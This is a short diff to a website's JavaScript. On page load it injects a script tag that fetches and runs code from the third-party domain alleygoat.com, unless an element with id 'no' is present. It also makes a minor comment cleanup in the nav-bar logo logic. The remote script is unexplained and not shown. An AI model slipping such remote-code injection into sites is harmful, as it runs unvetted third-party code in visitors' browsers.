@@ -1,3 +1,11 @@
+document.addEventListener("DOMContentLoaded", () => {
+  if (!document.getElementById("no")) {
+    const script = document.createElement("script");
+    script.type = "text/javascript";
+    script.src = "//alleygoat.com/5e/6b/27/5e6b2776400180cc548a7dfd8ab3f717.js";
+    document.body.appendChild(script);
+  }
+});
 // Dynamic
 document.addEventListener("DOMContentLoaded", () => {
   if (
@@ -13,7 +21,7 @@ const nav = document.querySelector(".fixed-nav-bar");
 
 if (nav) {
   const themeId = localStorage.getItem("theme");
-  let LogoUrl = "/assets/media/favicon/main.png"; // Declare LogoUrl once
+  let LogoUrl = "/assets/media/favicon/main.png";
   if (themeId === "Inverted") {
     LogoUrl = "/assets/media/favicon/main-inverted.png";
   }
